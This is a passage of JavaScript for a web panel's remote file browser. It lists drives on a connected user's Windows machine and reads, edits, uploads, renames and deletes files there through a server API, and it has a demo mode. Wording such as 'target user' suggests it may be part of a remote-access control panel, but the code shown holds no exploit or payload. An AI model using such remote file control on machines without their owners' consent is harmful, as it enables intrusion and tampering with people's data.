            return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
        } catch {
            return '—';
        }
    }

    function getFileIconClass(item) {
        if (item.is_dir) return { icon: 'bi-folder-fill', typeClass: 'dir' };
        const ext = (item.ext || '').toLowerCase();
        if (['.py', '.js', '.ts', '.json', '.html', '.css', '.ps1', '.bat', '.cmd', '.sh', '.yaml', '.yml', '.xml', '.c', '.cpp', '.h', '.cs', '.rs'].includes(ext)) {
            return { icon: 'bi-file-earmark-code', typeClass: 'code' };
        }
        if (['.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.bmp', '.svg'].includes(ext)) {
            return { icon: 'bi-file-earmark-image', typeClass: 'media' };
        }
        if (['.zip', '.tar', '.gz', '.7z', '.rar', '.bz2'].includes(ext)) {
            return { icon: 'bi-file-earmark-zip', typeClass: 'binary' };
        }
        if (['.exe', '.dll', '.bin', '.iso', '.sys', '.dat'].includes(ext)) {
            return { icon: 'bi-file-earmark-binary', typeClass: 'binary' };
        }
        if (['.txt', '.log', '.md', '.ini', '.cfg', '.conf', '.env'].includes(ext)) {
            return { icon: 'bi-file-earmark-text', typeClass: 'file' };
        }
        return { icon: 'bi-file-earmark', typeClass: 'file' };
    }

    function escapeHtml(str) {
        if (!str) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    let ftpHistoryDepth = 0;

    function openFtpBrowser() {
        const user = runState.popupUser;
        if (!user) return;
        ftpState.user = user;
        ftpState.isOpen = true;
        ftpState.currentPath = 'drives';
        ftpState.parentPath = null;
        ftpState.filterQuery = '';
        ftpState.previewData = null;

        const targetLabel = $('ftp-target-user');
        if (targetLabel) targetLabel.textContent = user.username + (user.demo ? ' (Demo Mode)' : '');

        const filterInput = $('ftp-filter-input');
        if (filterInput) filterInput.value = '';
        const clearBtn = $('ftp-filter-clear');
        if (clearBtn) clearBtn.style.display = 'none';

        closeFtpPreview(false);

        const modal = $('ftp-modal');
        if (modal) modal.style.display = 'flex';

        ftpHistoryDepth = 1;
        window.history.pushState({ ftp: true, path: 'drives' }, '');
        loadFtpPath('drives', false);
    }

    function closeFtpBrowser(fromUserAction = false) {
        if (!ftpState.isOpen) return;
        ftpState.isOpen = false;
        ftpState.user = null;
        closeFtpPreview(false);
        const modal = $('ftp-modal');
        if (modal) modal.style.display = 'none';

        if (fromUserAction && ftpHistoryDepth > 0) {
            const steps = ftpHistoryDepth;
            ftpHistoryDepth = 0;
            window.history.go(-steps);
        } else {
            ftpHistoryDepth = 0;
        }
    }

    function closeFtpPreview(fromUserAction = false) {
        toggleFtpEditMode(false);
        ftpState.previewData = null;
        ftpState.selectedItem = null;
        const drawer = $('ftp-preview-drawer');
        if (drawer) drawer.style.display = 'none';
        document.querySelectorAll('.ftp-file-row.selected').forEach(r => r.classList.remove('selected'));

        if (fromUserAction && window.history.state && window.history.state.preview) {
            ftpHistoryDepth = Math.max(1, ftpHistoryDepth - 1);
            window.history.back();
        }
    }

    function getDemoFsData(path) {
        if (!path || path === 'drives' || path === 'Drives') {
            return {
                is_drives: true,
                path: 'Drives',
                drives: [
                    { path: 'C:\\', label: 'C: (Local Disk)', total: 536870912000, free: 214748364800 },
                    { path: 'D:\\', label: 'D: (Secondary Volume)', total: 1073741824000, free: 644245094400 }
                ],
                items: []
            };
        }
        const clean = path.replace(/[\\/]+$/, '');
        const parent = clean.includes('\\') ? clean.substring(0, clean.lastIndexOf('\\')) || clean.substring(0, 3) : 'drives';
        return {
            is_drives: false,
            path: path,
            parent: clean.endsWith(':') ? 'drives' : (parent || 'drives'),
            drives: [
                { path: 'C:\\', label: 'C: (Local Disk)', total: 536870912000, free: 214748364800 },
                { path: 'D:\\', label: 'D: (Secondary Volume)', total: 1073741824000, free: 644245094400 }
            ],
            items: [
                { name: 'Windows', is_dir: true, size: 0, mtime: 1718000000, ext: '' },
                { name: 'Program Files', is_dir: true, size: 0, mtime: 1718000000, ext: '' },
                { name: 'Users', is_dir: true, size: 0, mtime: 1718000000, ext: '' },
                { name: 'AppData', is_dir: true, size: 0, mtime: 1718000000, ext: '' },
                { name: 'client_config.json', is_dir: false, size: 1420, mtime: 1719500000, ext: '.json' },
                { name: 'service_run.log', is_dir: false, size: 28450, mtime: 1719500000, ext: '.log' },
                { name: 'installer.exe', is_dir: false, size: 12582912, mtime: 1719500000, ext: '.exe' },
                { name: 'startup.ps1', is_dir: false, size: 850, mtime: 1719500000, ext: '.ps1' },
                { name: 'README.txt', is_dir: false, size: 520, mtime: 1719500000, ext: '.txt' }
            ]
        };
    }

    async function loadFtpPath(path, pushHistory = true) {
        if (ftpState.isLoading) return;
        ftpState.isLoading = true;
        closeFtpPreview(false);

        const listContainer = $('ftp-file-list');
        if (listContainer) {
            listContainer.innerHTML = `
                <div class="ftp-loading-state">
                    <div class="ftp-spinner"></div>
                    <span>Loading directory contents...</span>
                </div>
            `;
        }

        const isDemo = !runState.isConnected || ftpState.user?.demo;
        let data = null;

        if (isDemo) {
            await new Promise(r => setTimeout(r, 160));
            data = getDemoFsData(path);
        } else {
            try {
                const res = await fetch(`${VPS_URL}/api/fs/list`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                    body: JSON.stringify({ username: ftpState.user.username, path: path })
                });
                if (!res.ok) {
                    const errPayload = await res.json().catch(() => ({}));
                    throw new Error(errPayload.error || `HTTP ${res.status}`);
                }
                data = await res.json();
            } catch (err) {
                ftpState.isLoading = false;
                renderFtpError(err.message || 'Failed to list directory', path);
                return;
            }
        }

        ftpState.isLoading = false;

        if (data.error && (!data.items || !data.items.length)) {
            renderFtpError(data.error, data.path || path);
            return;
        }

        ftpState.currentPath = data.path || path;
        ftpState.parentPath = data.parent || (ftpState.currentPath === 'Drives' || ftpState.currentPath === 'drives' ? null : 'drives');
        if (data.drives) ftpState.drives = data.drives;
        ftpState.items = data.items || [];

        if (pushHistory) {
            ftpHistoryDepth++;
            window.history.pushState({ ftp: true, path: ftpState.currentPath }, '');
        }

        renderFtpDrivesBar();
        renderFtpBreadcrumbs();
        updateFtpParentBtnState();

        if (data.is_drives) {
            renderFtpDrivesGrid(data.drives || []);
        } else {
            renderFtpItemsList();
        }

        updateFtpStatusBar();
    }

    function renderFtpError(errMsg, currentPath) {
        const listContainer = $('ftp-file-list');
        if (!listContainer) return;
        listContainer.innerHTML = `
            <div class="ftp-error-state">
                <i class="bi bi-exclamation-triangle" style="font-size: 32px;"></i>
                <div style="font-size: 13px; font-weight: 600;">Unable to open path</div>
                <div style="font-size: 11.5px; opacity: 0.8; max-width: 380px;">${escapeHtml(errMsg)}</div>
                <div style="display: flex; gap: 8px; margin-top: 6px;">
                    <button type="button" class="ftp-drive-chip" id="ftp-err-drives-btn">
                        <i class="bi bi-hdd-network"></i> Return to Drives
                    </button>
                    ${currentPath && currentPath !== 'drives' ? `
                    <button type="button" class="ftp-drive-chip" id="ftp-err-retry-btn">
                        <i class="bi bi-arrow-clockwise"></i> Retry
                    </button>` : ''}
                </div>
            </div>
        `;
        $('ftp-err-drives-btn')?.addEventListener('click', () => loadFtpPath('drives'));
        $('ftp-err-retry-btn')?.addEventListener('click', () => loadFtpPath(currentPath));
        renderFtpBreadcrumbs();
        updateFtpStatusBar();
    }

    function renderFtpDrivesBar() {
        const bar = $('ftp-drives-bar');
        if (!bar) return;
        bar.innerHTML = '';

        const allDrivesBtn = document.createElement('button');
        allDrivesBtn.type = 'button';
        allDrivesBtn.className = 'ftp-drive-chip' + (ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives' ? ' active' : '');
        allDrivesBtn.innerHTML = '<i class="bi bi-hdd-network"></i> Drives';
        allDrivesBtn.onclick = () => loadFtpPath('drives');
        bar.appendChild(allDrivesBtn);

        ftpState.drives.forEach(d => {
            const btn = document.createElement('button');
            btn.type = 'button';
            const isActive = ftpState.currentPath.toUpperCase().startsWith(d.path.toUpperCase());
            btn.className = 'ftp-drive-chip' + (isActive ? ' active' : '');
            btn.innerHTML = `<i class="bi bi-hdd"></i> ${escapeHtml(d.path)}`;
            btn.onclick = () => loadFtpPath(d.path);
            bar.appendChild(btn);
        });
    }

    function renderFtpBreadcrumbs() {
        const container = $('ftp-breadcrumbs');
        if (!container) return;
        container.innerHTML = '';

        const isDrives = ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives';

        const rootCrumb = document.createElement('span');
        rootCrumb.className = 'ftp-crumb-item' + (isDrives ? ' active' : '');
        rootCrumb.innerHTML = '<i class="bi bi-hdd-network"></i> Drives';
        if (!isDrives) {
            rootCrumb.onclick = () => loadFtpPath('drives');
        }
        container.appendChild(rootCrumb);

        if (isDrives) return;

        const path = ftpState.currentPath;
        const parts = path.split(/[\\/]+/).filter(Boolean);

        let accumulated = '';
        parts.forEach((part, idx) => {
            const sep = document.createElement('span');
            sep.className = 'ftp-crumb-sep';
            sep.textContent = '/';
            container.appendChild(sep);

            if (idx === 0 && part.includes(':')) {
                accumulated = part + '\\';
            } else if (accumulated.endsWith('\\')) {
                accumulated += part;
            } else {
                accumulated += '\\' + part;
            }

            const isLast = idx === parts.length - 1;
            const crumb = document.createElement('span');
            crumb.className = 'ftp-crumb-item' + (isLast ? ' active' : '');
            crumb.textContent = part;

            if (!isLast) {
                const targetPath = accumulated;
                crumb.onclick = () => loadFtpPath(targetPath);
            }
            container.appendChild(crumb);
        });
    }

    function updateFtpParentBtnState() {
        const btn = $('ftp-parent-btn');
        if (!btn) return;
        const isDrives = ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives';
        btn.disabled = isDrives;
    }

    function renderFtpDrivesGrid(drives) {
        const listContainer = $('ftp-file-list');
        if (!listContainer) return;

        if (!drives || !drives.length) {
            listContainer.innerHTML = `
                <div class="ftp-empty-state">
                    <i class="bi bi-hdd ftp-empty-icon"></i>
                    <div>No accessible drives detected.</div>
                </div>
            `;
            return;
        }

        const grid = document.createElement('div');
        grid.className = 'ftp-drives-grid';

        drives.forEach(d => {
            const card = document.createElement('div');
            card.className = 'ftp-drive-card';
            card.tabIndex = 0;

            const total = d.total || 0;
            const free = d.free || 0;
            const used = total > free ? total - free : 0;
            const pct = total > 0 ? Math.round((used / total) * 100) : 0;

            card.innerHTML = `
                <div class="ftp-drive-head">
                    <i class="bi bi-hdd-fill ftp-drive-icon"></i>
                    <div>
                        <div class="ftp-drive-title">${escapeHtml(d.path)}</div>
                        <div class="ftp-drive-sub">${escapeHtml(d.label || 'Local Disk')}</div>
                    </div>
                </div>
                <div class="ftp-drive-bar-wrap">
                    <div class="ftp-drive-bar-fill" style="width: ${pct}%"></div>
                </div>
                <div class="ftp-drive-usage">
                    <span>${formatFileSize(free)} free</span>
                    <span>${formatFileSize(total)}</span>
                </div>
            `;

            card.onclick = () => loadFtpPath(d.path);
            card.onkeydown = e => {
                if (e.key === 'Enter') loadFtpPath(d.path);
            };
            grid.appendChild(card);
        });

        listContainer.innerHTML = '';
        listContainer.appendChild(grid);
    }

    function renderFtpItemsList() {
        const listContainer = $('ftp-file-list');
        if (!listContainer) return;

        const q = ftpState.filterQuery;
        const filtered = q
            ? ftpState.items.filter(it => it.name.toLowerCase().includes(q))
            : ftpState.items;

        ftpState.filteredItems = filtered;

        if (!filtered.length) {
            listContainer.innerHTML = `
                <div class="ftp-empty-state">
                    <i class="bi bi-folder2-open ftp-empty-icon"></i>
                    <div>${q ? 'No matching files or folders found.' : 'This directory is empty.'}</div>
                </div>
            `;
            return;
        }

        listContainer.innerHTML = '';

        filtered.forEach(item => {
            const row = document.createElement('div');
            row.className = 'ftp-file-row';
            row.tabIndex = 0;

            const { icon, typeClass } = getFileIconClass(item);
            const sizeStr = item.is_dir ? 'Folder' : formatFileSize(item.size);
            const dateStr = formatFileDate(item.mtime);

            row.innerHTML = `
                <div class="ftp-row-name">
                    <i class="bi ${icon} ftp-row-icon ${typeClass}"></i>
                    <span class="ftp-row-name-text" title="${escapeHtml(item.name)}">${escapeHtml(item.name)}</span>
                </div>
                <div class="ftp-row-size">${sizeStr}</div>
                <div class="ftp-row-date">${dateStr}</div>
                <div class="ftp-row-actions">
                    <button type="button" class="ftp-row-action-btn" title="Rename" data-action="rename">
                        <i class="bi bi-pencil"></i>
                    </button>
                    <button type="button" class="ftp-row-action-btn danger" title="Delete" data-action="delete">
                        <i class="bi bi-trash3"></i>
                    </button>
                </div>
            `;

            row.onclick = () => onFtpRowClick(item, row);
            row.ondblclick = () => {
                if (item.is_dir) {
                    const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
                    loadFtpPath(ftpState.currentPath + sep + item.name);
                }
            };
            row.onkeydown = e => {
                if (e.key === 'Enter') {
                    if (item.is_dir) {
                        const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
                        loadFtpPath(ftpState.currentPath + sep + item.name);
                    } else {
                        onFtpRowClick(item, row);
                    }
                }
            };

            const renameBtn = row.querySelector('[data-action="rename"]');
            if (renameBtn) {
                renameBtn.onclick = e => {
                    e.stopPropagation();
                    doFtpRename(item);
                };
            }

            const delBtn = row.querySelector('[data-action="delete"]');
            if (delBtn) {
                delBtn.onclick = e => {
                    e.stopPropagation();
                    doFtpDelete(item);
                };
            }

            listContainer.appendChild(row);
        });
    }

    function onFtpRowClick(item, rowEl) {
        if (item.is_dir) {
            const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
            loadFtpPath(ftpState.currentPath + sep + item.name);
            return;
        }

        document.querySelectorAll('.ftp-file-row.selected').forEach(r => r.classList.remove('selected'));
        if (rowEl) rowEl.classList.add('selected');
        ftpState.selectedItem = item;

        const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
        const fullPath = ftpState.currentPath + sep + item.name;
        openFilePreview(item, fullPath);
    }

    async function openFilePreview(item, fullPath) {
        const drawer = $('ftp-preview-drawer');
        if (!drawer) return;
        drawer.style.display = 'flex';
        toggleFtpEditMode(false);

        $('ftp-preview-name').textContent = item.name;
        $('ftp-preview-size').textContent = formatFileSize(item.size);

        const { icon } = getFileIconClass(item);
        const iconEl = $('ftp-preview-icon');
        if (iconEl) iconEl.className = `bi ${icon} ftp-preview-icon`;

        const codeContent = $('ftp-preview-code-content');
        const editor = $('ftp-preview-editor');
        const editBtn = $('ftp-preview-edit');
        const saveBtn = $('ftp-preview-save');

        if (codeContent) codeContent.textContent = 'Loading file contents...';
        if (editor) editor.value = '';
        if (editBtn) editBtn.style.display = 'none';
        if (saveBtn) saveBtn.style.display = 'none';

        const isDemo = !runState.isConnected || ftpState.user?.demo;
        let data = null;

        if (isDemo) {
            await new Promise(r => setTimeout(r, 120));
            data = {
                type: 'text',
                name: item.name,
                path: fullPath,
                size: item.size,
                content: `// Sample file preview for ${item.name}\n// Path: ${fullPath}\n// Target: ${ftpState.user?.username || 'localhost'}\n\n{\n  "service": "run",\n  "version": "1.0.0",\n  "status": "active",\n  "timestamp": ${Date.now()}\n}`
            };
        } else {
            try {
                const res = await fetch(`${VPS_URL}/api/fs/read`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                    body: JSON.stringify({ username: ftpState.user.username, path: fullPath })
                });
                if (!res.ok) {
                    const errPayload = await res.json().catch(() => ({}));
                    throw new Error(errPayload.error || `HTTP ${res.status}`);
                }
                data = await res.json();
            } catch (err) {
                if (codeContent) codeContent.textContent = `Failed to read file: ${err.message}`;
                return;
            }
        }

        if (data.error) {
            if (codeContent) codeContent.textContent = `Access error: ${data.error}`;
            return;
        }

        ftpState.previewData = data;
        ftpHistoryDepth++;
        window.history.pushState({ ftp: true, path: ftpState.currentPath, preview: true }, '');

        if (data.type === 'text') {
            if (codeContent) codeContent.textContent = data.content;
            if (editor) editor.value = data.content;
            if (editBtn) editBtn.style.display = 'inline-flex';
        } else if (data.type === 'binary') {
            const ext = (item.ext || '').toLowerCase();
            if (['.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp'].includes(ext)) {
                const mime = ext === '.png' ? 'image/png' : ext === '.gif' ? 'image/gif' : ext === '.webp' ? 'image/webp' : 'image/jpeg';
                const body = $('ftp-preview-body');
                if (body) {
                    body.innerHTML = `
                        <div class="ftp-preview-img-wrap">
                            <img src="data:${mime};base64,${data.content}" class="ftp-preview-img" alt="${escapeHtml(item.name)}">
                        </div>
                    `;
                }
            } else {
                if (codeContent) codeContent.textContent = `[Binary File - ${formatFileSize(data.size)}]\nUse the download button above to export this file.`;
            }
        }
    }

    function toggleFtpEditMode(editing) {
        ftpState.isEditing = editing;
        const pre = $('ftp-preview-code-content')?.parentElement;
        const editor = $('ftp-preview-editor');
        const editBtn = $('ftp-preview-edit');
        const saveBtn = $('ftp-preview-save');

        if (pre) pre.style.display = editing ? 'none' : 'block';
        if (editor) {
            editor.style.display = editing ? 'block' : 'none';
            if (editing && ftpState.previewData?.type === 'text') {
                editor.value = ftpState.previewData.content || '';
                editor.focus();
            }
        }
        if (editBtn) editBtn.style.display = editing ? 'none' : (ftpState.previewData?.type === 'text' ? 'inline-flex' : 'none');
        if (saveBtn) saveBtn.style.display = editing ? 'inline-flex' : 'none';
    }

    async function doFtpSaveFile() {
        if (!ftpState.previewData) return;
        const editor = $('ftp-preview-editor');
        if (!editor) return;

        const newContent = editor.value;
        const filePath = ftpState.previewData.path;
        const saveBtn = $('ftp-preview-save');

        if (saveBtn) {
            saveBtn.style.pointerEvents = 'none';
            saveBtn.style.opacity = '0.6';
        }

        const isDemo = !runState.isConnected || ftpState.user?.demo;

        if (isDemo) {
            ftpState.previewData.content = newContent;
            const codeEl = $('ftp-preview-code-content');
            if (codeEl) codeEl.textContent = newContent;
            toggleFtpEditMode(false);
            if (saveBtn) {
                saveBtn.style.pointerEvents = '';
                saveBtn.style.opacity = '';
                saveBtn.innerHTML = '<i class="bi bi-check2"></i>';
                setTimeout(() => { saveBtn.innerHTML = '<i class="bi bi-floppy"></i>'; }, 1400);
            }
            return;
        }

        try {
            const res = await fetch(`${VPS_URL}/api/fs/write`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({
                    username: ftpState.user.username,
                    path: filePath,
                    content: newContent
                })
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok || data.error) throw new Error(data.error || 'Failed to save file');

            ftpState.previewData.content = newContent;
            const codeEl = $('ftp-preview-code-content');
            if (codeEl) codeEl.textContent = newContent;
            toggleFtpEditMode(false);

            if (saveBtn) {
                saveBtn.innerHTML = '<i class="bi bi-check2"></i>';
                setTimeout(() => { saveBtn.innerHTML = '<i class="bi bi-floppy"></i>'; }, 1400);
            }
        } catch (err) {
            alert(err.message || 'Error saving file');
        } finally {
            if (saveBtn) {
                saveBtn.style.pointerEvents = '';
                saveBtn.style.opacity = '';
            }
        }
    }

    function showFtpDialog({ title, msg = '', value = '', isConfirm = false, isDanger = false }) {
        return new Promise(resolve => {
            const overlay = $('ftp-dialog-overlay');
            const titleEl = $('ftp-dialog-title');
            const msgEl = $('ftp-dialog-msg');
            const bodyEl = $('ftp-dialog-body');
            const inputEl = $('ftp-dialog-input');
            const cancelBtn = $('ftp-dialog-cancel');
            const confirmBtn = $('ftp-dialog-confirm');

            if (!overlay || !inputEl || !confirmBtn) {
                const res = isConfirm ? confirm(title + (msg ? '\n' + msg : '')) : prompt(title, value);
                resolve({ confirmed: !!res, value: res || '' });
                return;
            }

            titleEl.textContent = title;
            if (msg) {
                msgEl.textContent = msg;
                msgEl.style.display = 'block';
            } else {
                msgEl.style.display = 'none';
            }

            if (isConfirm) {
                bodyEl.style.display = 'none';
            } else {
                bodyEl.style.display = 'block';
                inputEl.value = value;
            }

            confirmBtn.className = 'ftp-dialog-btn ' + (isDanger ? 'danger' : 'primary');
            overlay.style.display = 'flex';

            const cleanup = () => {
                overlay.style.display = 'none';
                cancelBtn.onclick = null;
                confirmBtn.onclick = null;
                inputEl.onkeydown = null;
                overlay.onclick = null;
            };

            cancelBtn.onclick = () => {
                cleanup();
                resolve({ confirmed: false, value: '' });
            };

            const doConfirm = () => {
                const val = inputEl.value.trim();
                cleanup();
                resolve({ confirmed: true, value: val });
            };

            confirmBtn.onclick = doConfirm;
            inputEl.onkeydown = e => {
                if (e.key === 'Enter') doConfirm();
                if (e.key === 'Escape') {
                    cleanup();
                    resolve({ confirmed: false, value: '' });
                }
            };

            overlay.onclick = e => {
                if (e.target === overlay) {
                    cleanup();
                    resolve({ confirmed: false, value: '' });
                }
            };

            if (!isConfirm) {
                setTimeout(() => {
                    inputEl.focus();
                    inputEl.select();
                }, 50);
            }
        });
    }

    async function doFtpMkdir() {
        if (ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives') {
            alert('Please select a drive first before creating folders.');
            return;
        }
        const { confirmed, value: name } = await showFtpDialog({
            title: 'New Folder',
            value: 'New folder'
        });
        if (!confirmed || !name) return;

        const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
        const dirPath = ftpState.currentPath + sep + name;

        if (!runState.isConnected || ftpState.user?.demo) {
            ftpState.items.unshift({ name, is_dir: true, size: 0, mtime: Math.floor(Date.now() / 1000) });
            renderFtpItemsList();
            updateFtpStatusBar();
            return;
        }

        try {
            const res = await fetch(`${VPS_URL}/api/fs/mkdir`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: ftpState.user.username, path: dirPath })
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok || data.error) throw new Error(data.error || 'Failed to create folder');
            loadFtpPath(ftpState.currentPath, false);
        } catch (err) {
            alert(err.message || 'Error creating folder');
        }
    }

    async function doFtpNewFile() {
        if (ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives') {
            alert('Please select a drive first before creating files.');
            return;
        }
        const { confirmed, value: name } = await showFtpDialog({
            title: 'New File',
            value: 'new_file.txt'
        });
        if (!confirmed || !name) return;

        const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
        const filePath = ftpState.currentPath + sep + name;

        if (!runState.isConnected || ftpState.user?.demo) {
            const ext = name.includes('.') ? name.substring(name.lastIndexOf('.')) : '';
            ftpState.items.unshift({ name, is_dir: false, size: 0, mtime: Math.floor(Date.now() / 1000), ext });
            renderFtpItemsList();
            updateFtpStatusBar();
            return;
        }

        try {
            const res = await fetch(`${VPS_URL}/api/fs/write`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: ftpState.user.username, path: filePath, content: '' })
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok || data.error) throw new Error(data.error || 'Failed to create file');
            loadFtpPath(ftpState.currentPath, false);
        } catch (err) {
            alert(err.message || 'Error creating file');
        }
    }

    function handleFtpFileUpload(files) {
        if (!files || !files.length) return;
        if (ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives') {
            alert('Please select a drive and folder before uploading files.');
            return;
        }

        Array.from(files).forEach(file => {
            const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
            const targetPath = ftpState.currentPath + sep + file.name;

            const reader = new FileReader();
            reader.onload = async ev => {
                const b64 = ev.target.result.split(',')[1] || '';
                if (!runState.isConnected || ftpState.user?.demo) {
                    ftpState.items.unshift({
                        name: file.name,
                        is_dir: false,
                        size: file.size,
                        mtime: Math.floor(Date.now() / 1000),
                        ext: file.name.substring(file.name.lastIndexOf('.'))
                    });
                    renderFtpItemsList();
                    updateFtpStatusBar();
                    return;
                }

                try {
                    const res = await fetch(`${VPS_URL}/api/fs/write`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                        body: JSON.stringify({
                            username: ftpState.user.username,
                            path: targetPath,
                            content: b64,
                            is_base64: true
                        })
                    });
                    const data = await res.json().catch(() => ({}));
                    if (!res.ok || data.error) throw new Error(data.error || 'Upload failed');
                    loadFtpPath(ftpState.currentPath, false);
                } catch (err) {
                    alert(err.message || `Error uploading ${file.name}`);
                }
            };
            reader.readAsDataURL(file);
        });
    }

    async function doFtpDelete(item) {
        const isDir = item.is_dir;
        const { confirmed } = await showFtpDialog({
            title: `Delete ${isDir ? 'Folder' : 'File'}`,
            msg: `Are you sure you want to delete "${item.name}"? This cannot be undone.`,
            isConfirm: true,
            isDanger: true
        });
        if (!confirmed) return;

        const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
        const fullPath = ftpState.currentPath + sep + item.name;

        if (!runState.isConnected || ftpState.user?.demo) {
            ftpState.items = ftpState.items.filter(i => i.name !== item.name);
            renderFtpItemsList();
            updateFtpStatusBar();
            if (ftpState.previewData?.path === fullPath) closeFtpPreview();
            return;
        }

        try {
            const res = await fetch(`${VPS_URL}/api/fs/delete`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: ftpState.user.username, path: fullPath })
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok || data.error) throw new Error(data.error || 'Failed to delete');
            if (ftpState.previewData?.path === fullPath) closeFtpPreview();
            loadFtpPath(ftpState.currentPath, false);
        } catch (err) {
            alert(err.message || 'Error deleting item');
        }
    }

    async function doFtpRename(item) {
        const isDir = item.is_dir;
        const { confirmed, value: newName } = await showFtpDialog({
            title: `Rename ${isDir ? 'Folder' : 'File'}`,
            value: item.name
        });
        if (!confirmed || !newName || newName === item.name) return;

        const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
        const oldPath = ftpState.currentPath + sep + item.name;
        const newPath = ftpState.currentPath + sep + newName;

        if (!runState.isConnected || ftpState.user?.demo) {
            item.name = newName;
            renderFtpItemsList();
            return;
        }

        try {
            const res = await fetch(`${VPS_URL}/api/fs/rename`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({
                    username: ftpState.user.username,
                    old_path: oldPath,
                    new_path: newPath
                })
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok || data.error) throw new Error(data.error || 'Failed to rename');
            loadFtpPath(ftpState.currentPath, false);
        } catch (err) {
            alert(err.message || 'Error renaming item');
        }
    }

    function setupFtpHistoryListener() {
        window.addEventListener('popstate', e => {
            if (!ftpState.isOpen) return;

            ftpHistoryDepth = Math.max(0, ftpHistoryDepth - 1);

            const isPreviewOpen = $('ftp-preview-drawer')?.style.display !== 'none';
            if (isPreviewOpen && (!e.state || !e.state.preview)) {
                closeFtpPreview(false);
                return;
            }

            const targetPath = (e.state && e.state.path !== undefined) ? e.state.path : null;
            if (e.state && e.state.ftp && targetPath !== null) {
                loadFtpPath(targetPath, false);
            } else {
                closeFtpBrowser(false);
            }
        });
    }

    function copyFtpPreviewContent() {
        if (!ftpState.previewData) return;
        const text = ftpState.previewData.content || '';
        navigator.clipboard.writeText(text).then(() => {
            const copyBtn = $('ftp-preview-copy');
            if (copyBtn) {
                copyBtn.innerHTML = '<i class="bi bi-check2"></i>';
                setTimeout(() => { copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>'; }, 1500);
            }
        }).catch(() => {
            alert('Failed to copy to clipboard');
        });
    }

    function downloadFtpPreviewFile() {
        if (!ftpState.previewData) return;
        const data = ftpState.previewData;
        const filename = data.name || 'download';

        let blob;
        if (data.type === 'binary') {
            const byteChars = atob(data.content);
            const byteNumbers = new Array(byteChars.length);
            for (let i = 0; i < byteChars.length; i++) {
                byteNumbers[i] = byteChars.charCodeAt(i);
            }
            blob = new Blob([new Uint8Array(byteNumbers)], { type: 'application/octet-stream' });
        } else {
            blob = new Blob([data.content], { type: 'text/plain;charset=utf-8' });
        }

        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        setTimeout(() => URL.revokeObjectURL(url), 1000);
    }

    function updateFtpStatusBar() {
        const left = $('ftp-status-left');
        const right = $('ftp-status-path');
        if (left) {
            const isDrives = ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives';
            if (isDrives) {
                left.textContent = `${ftpState.drives.length} drive${ftpState.drives.length !== 1 ? 's' : ''}`;
            } else {
                const count = ftpState.filteredItems ? ftpState.filteredItems.length : ftpState.items.length;
                left.textContent = `${count} item${count !== 1 ? 's' : ''}${ftpState.filterQuery ? ' (filtered)' : ''}`;
            }
        }
        if (right) {
            right.textContent = ftpState.currentPath;
        }
    }

    function initFtpBrowser() {
        $('ftp-close-btn')?.addEventListener('click', () => closeFtpBrowser(true));
        $('ftp-refresh-btn')?.addEventListener('click', () => loadFtpPath(ftpState.currentPath, false));
        $('ftp-parent-btn')?.addEventListener('click', () => {
            if (ftpState.parentPath) loadFtpPath(ftpState.parentPath, true);
        });

        // Preview actions
        $('ftp-preview-close')?.addEventListener('click', () => closeFtpPreview(true));
        $('ftp-preview-edit')?.addEventListener('click', () => toggleFtpEditMode(true));
        $('ftp-preview-save')?.addEventListener('click', doFtpSaveFile);
        $('ftp-preview-copy')?.addEventListener('click', copyFtpPreviewContent);
        $('ftp-preview-download')?.addEventListener('click', downloadFtpPreviewFile);

        // CRUD Toolbar actions
        $('ftp-mkdir-btn')?.addEventListener('click', doFtpMkdir);
        $('ftp-newfile-btn')?.addEventListener('click', doFtpNewFile);
        $('ftp-upload-btn')?.addEventListener('click', () => $('ftp-file-input')?.click());

        const fileInput = $('ftp-file-input');
        if (fileInput) {
            fileInput.addEventListener('change', e => {
                handleFtpFileUpload(e.target.files);
                e.target.value = '';
            });
        }

        // Search / Filter
        const filterInput = $('ftp-filter-input');
        if (filterInput) {
            filterInput.addEventListener('input', e => {
                ftpState.filterQuery = e.target.value.toLowerCase().trim();
